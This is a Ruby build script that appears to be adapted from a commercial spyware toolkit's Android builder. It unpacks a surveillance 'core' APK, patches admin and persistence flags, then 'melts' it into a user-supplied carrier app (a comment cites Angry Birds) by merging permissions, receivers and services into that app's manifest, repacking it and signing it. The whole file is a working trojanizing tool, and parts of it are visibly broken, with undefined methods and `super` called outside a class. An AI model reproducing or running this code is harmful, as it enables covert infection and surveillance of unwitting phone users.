require 'FileUtils'
require 'xmlsimple'
require 'pp'

BASE="~/android"
APKTOOL="~/Reversing/Android/apktool/2.0/apktool_2.0.0rc2.jar"
BAKSMALI="~/Reversing/Android/baksmali-2.0.3.jar"
SMALI="~/Reversing/Android/smali-2.0.3.jar"
#APKTOOL="#{BASE}/apktool_1.4.3.jar"

# Unable to start service Intent { cmp=com.rovio.angrybirds/com.android.networking.ServiceCore }


def execute(command)
	print "- #{command}\n"
	system command
end

def trace (a,b)
	print b + "\n"
end

def path (p)
	"./tmp/" + p
end

class CrossPlatform
	def self.exec(cmd, args, add="")
		system cmd + ' ' + args
	end
end

# class Config
#   def instance()
#       return Config()
#   end
#   def temp(input)
#     return input
#   end
# end

def unpack
  trace :debug, "Build: apktool extract: #{@tmpdir}/apk"

  apktool = path('apktool.jar')

  Dir[path('core.*.apk')].each do |d|
    version = d.scan(/core.android.(.*).apk/).flatten.first

    if version == "melt" then
      trace :debug,  "-jar #{apktool} d -f #{d} -o #{@tmpdir}/apk.#{version}"
      #CrossPlatform.exec "java", "-jar #{apktool} if #{@tmpdir}/jelly.apk jelly"
      CrossPlatform.exec "java", "-jar #{apktool} d -f #{d} -o #{@tmpdir}/apk.#{version}"
    else
      trace :debug,  "-jar #{apktool} d -f -s -r #{d} -o #{@tmpdir}/apk.#{version}"
      CrossPlatform.exec "java", "-jar #{apktool} d -f -s -r #{d} -o #{@tmpdir}/apk.#{version}"
    end

    ["rb.data", "cb.data"].each do |asset|
      CrossPlatform.exec "pwd",""
       exists =  File.exist?(path("apk.#{version}/assets/#{asset}"))
       trace :debug, "check #{@tmpdir}/apk.#{version}/assets/#{asset} #{exists}" 

      raise "unpack failed. needed asset #{asset} not found" unless File.exist?(path("apk.#{version}/assets/#{asset}"))
    end

  end
end


  def patch(params)
    trace :debug, "Build: patching: #{params}"

    # enforce demo flag accordingly to the license
    # or raise if cannot build
    params['demo'] = LicenseManager.instance.can_build_platform :android, params['demo']

    Dir[path('core.*.apk')].each do |d|
      version = d.scan(/core.android.(.*).apk/).flatten.first

      # add the file to be patched to the params
      # these params will be passed to the super
      params[:core] = "apk.#{version}/assets/rb.data"
      params[:config] = "apk.#{version}/assets/cb.data"

      # invoke the generic patch method with the new params
      super

      patch_file(:file => params[:core]) do |content|
      begin
        # SecureRandom.base64(12).length() == 16
        method = params['admin'] ? 'IrXCtyrrDXMJEvOU' : SecureRandom.base64(12)
        content.binary_patch 'IrXCtyrrDXMJEvOU', method
        method = params['persist'] ? 'o5wp2Izl8jTwr8hf' : SecureRandom.base64(12)
        content.binary_patch 'o5wp2Izl8jTwr8hf', method
      rescue
        raise "Working method marker not found"
      end
      end
    end
  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    @appname = params['appname'] || 'install'
    @outputs = []

    # choose the correct melting mode
    melting_mode = :silent
    melting_mode = :melted if params['input']

    case melting_mode
      when :silent
        silent()
      when :melted
        # user-provided file to melt with
        #melted(RbConfig.instance.temp(params['input']))
        melted(path(params['input']))
    end

    trace :debug, "Build: melt output is: #{@outputs.inspect}"

    raise "Melt failed" if @outputs.empty?
  end

  def sign(params)
    trace :debug, "Build: signing with ~/Reversing/Android/cert/sandroid.keystore"

    apks = @outputs
    @outputs = []

    apks.each do |d|
      version = d.scan(/output.(.*).apk/).flatten.first

      apk = path(d)
      output = "#{@appname}.#{version}.apk"
      core = path(output)

      raise "Cannot find keystore" unless File.exist? 'certs/android.keystore'

      CrossPlatform.exec "jarsigner", "-sigalg MD5withRSA -digestalg SHA1 -keystore #{'certs/android.keystore'} -storepass password -keypass password #{apk} ServiceCore"

      raise "jarsigner failed" unless File.exist? apk

      File.chmod(0755, path('zipalign')) if File.exist? path('zipalign')
      CrossPlatform.exec path('zipalign'), "-f 4 #{apk} #{core}" or raise("cannot align apk")

      FileUtils.rm_rf(apk)

      @outputs << output
    end
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|
      @outputs.each do |o|
        z.file.open(o, "wb") { |f| f.write File.open(path(o), 'rb') {|f| f.read} }
      end
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

  def unique(core)
    Zip::File.open(core) do |z|
      z.each do |f|
        f_path = path(f.name)
        FileUtils.mkdir_p(File.dirname(f_path))

        # skip empty dirs
        next if File.directory?(f.name)

        z.extract(f, f_path) unless File.exist?(f_path)
      end
    end

    apktool = path('apktool.jar')

    Dir[path('core.*.apk')].each do |apk|
      version = apk.scan(/core.android.(.*).apk/).flatten.first

      CrossPlatform.exec "java", "-jar #{apktool} d -f -s -r #{apk} -o #{@tmpdir}/apk.#{version}"

      core_content = File.open(path("apk.#{version}/assets/rb.data"), "rb") { |f| f.read }
      add_magic(core_content)
      File.open(path("apk.#{version}/assets/rb.data"), "wb") { |f| f.write core_content }

      FileUtils.rm_rf apk

      CrossPlatform.exec "java", "-jar #{apktool} b #{@tmpdir}/apk.#{version} -o #{apk}", {add_path: @tmpdir}

      # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
      CrossPlatform.exec "zip", "-j -u #{core} #{apk}"
      FileUtils.rm_rf Config.instance.temp('apk')
    end
  end

  def silent
    trace :debug, "Build: silent installer"

    apktool = path('apktool.jar')
    File.chmod(0755, path('aapt')) if File.exist? path('aapt')

    Dir[path('core.*.apk')].each do |d|
      version = d.scan(/core.android.(.*).apk/).flatten.first
      next if version == "melt"

      apk = path("output.#{version}.apk")

      CrossPlatform.exec "java", "-jar #{apktool} b #{@tmpdir}/apk.#{version} -o #{apk}", {add_path: @tmpdir}

      raise "Silent Melt: pack failed." unless File.exist?(apk)

      @outputs << "output.#{version}.apk"
    end
  end

  def melted(input)
    trace :debug, "Build: melted installer"

    apktool = path('apktool.jar')
    trace :debug, "apktool: #{apktool}, input: #{input}, path: #{path('input')}"

    FileUtils.mv input, path('input')
    rcsdir = "#{@tmpdir}/apk.melt"
    pkgdir = "#{@tmpdir}/melt_input"

    trace :debug, "rcsdir: #{rcsdir}, pkgdir: #{pkgdir}"

    # unpack the dropper application
    trace :debug, "java -jar #{apktool} d -f #{path('input')} -o #{pkgdir}"
    CrossPlatform.exec "java", "-jar #{apktool} d -f #{path('input')} -o #{pkgdir}"
    #FileUtils.cp path('AndroidManifest.xml'), rcsdir

    # load and mix the manifest and resources
    newmanifest = parse_manifest(rcsdir, pkgdir)

    # merge the directories
    trace :debug, "merge"
    merge(rcsdir, pkgdir)

    # fix the xml headers
    trace :debug, "patch_xml"
    patch_xml("#{rcsdir}/AndroidManifest.xml", newmanifest)

    # fix textAllCaps
    trace :debug, "patch_resources"
    patch_resources(rcsdir)

    # repack the final application
    trace :debug, "repack"
    apk = path("output.m.apk")
    CrossPlatform.exec "java", "-jar #{apktool} b #{rcsdir} -o #{apk}", {add_path: @tmpdir}

    @outputs = ["output.m.apk"] if File.exist?(apk)
  end

  def parse_manifest(rcsdir, pkgdir)
    trace :debug, "parse manifest #{rcsdir}, #{pkgdir}"

    xmlrcs = XmlSimple.xml_in("#{rcsdir}/AndroidManifest.xml", {'KeepRoot' => true})
    xmlpkg = XmlSimple.xml_in("#{pkgdir}/AndroidManifest.xml", {'KeepRoot' => true})

    mix_manifest_permission(xmlpkg, xmlrcs, "uses-permission")
    mix_manifest_application(xmlpkg, xmlrcs, "receiver")
    #mix_manifest_application(xmlpkg, xmlrcs, "activity")
    mix_manifest_application(xmlpkg, xmlrcs, "service")

    trace :debug, "producing output"
    return XmlSimple.xml_out(xmlpkg, {'KeepRoot' => true})

  rescue Exception => e
    trace :error, "Cannot parse Manifest: #{e.message}"
    raise "Cannot parse Manifest: #{e.message}"
  end

  def mix_manifest_permission(xmlpkg, xmlrcs, key)
    trace :debug, "mix manifest perm #{key}"

    tmppkg = xmlpkg["manifest"][0]
    tmprcs = xmlrcs["manifest"][0]

    if tmppkg.has_key? key
      tmppkg[key] += tmprcs[key]
    else
      tmppkg[key] = tmprcs[key]
    end
  end

  def mix_manifest_application(xmlpkg, xmlrcs, key)
    trace :debug, "mix manifest app #{key}"

    tmppkg = xmlpkg["manifest"][0]["application"][0]
    tmprcs = xmlrcs["manifest"][0]["application"][0]

    if tmppkg.has_key? key
      tmppkg[key] += tmprcs[key]
    else
      tmppkg[key] = tmprcs[key]
    end
  end

  def patch_xml(file, xml)
    xml.insert(0, "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n")
    File.open(file, "w") {|f| f.write xml}
  end

  def patch_resources(rcsdir)
    matches = ['android:textAllCaps="true"', '<item name="android:borderTop">true</item>']
    #matches = ['android:textAllCaps="true"']

    Dir["#{rcsdir}/res/**/*.xml"].each do |filename|
      found = false
      content = ""

      File.open(filename, 'r').each do |line|
        matches.each do |match|
        if line.include? match
          found = true
          line = line.sub(match, '')
        end
      end

      content+=line
    end

    trace :debug, "melt resource patched: #{filename}" if found
    File.open("#{filename}", 'w') { |out_file| out_file.write content } if found

    end
  end


  def mix_manifest_resources(from, to, key)
    xt = XmlSimple.xml_in to, {'KeepRoot' => true}

    if File.exists? from
      xml = XmlSimple.xml_in from, {'KeepRoot' => true}
      xml["resources"][0][key] += xt["resources"][0][key]
    else
      xml = xt
    end

    return xml
  end


def merge(rcsdir, pkgdir)
  FileUtils.rm "#{rcsdir}/res/layout/main.xml"
  FileUtils.cp_r "#{pkgdir}/.", "#{rcsdir}"

end

def main(package)
	@tmpdir = "tmp"
	@pack = package
	params = {}

	print "package: " + package + "\n"

	print "UNPACK\n"
	unpack
	print "MELT\n"
  FileUtils.cp package, path(package)
  FileUtils.cp 'zipalign', path('zipalign')
	melt ({"input"=>package})
	print "SIGN\n"
	sign params
	print "PACK\n"
	pack params
end

def test(package)
	@pack = package
	pkgdir=unpack()
	print "pkgir: #{pkgdir}\n"
	pack(pkgdir)
end

#test

begin
	r = main ARGV[0]
	#test(ARGV[0])
	puts "merge exit => #{r}"
	exit 1 if !r
rescue Exception => ex
	puts ex
	exit 1
end

exit 0
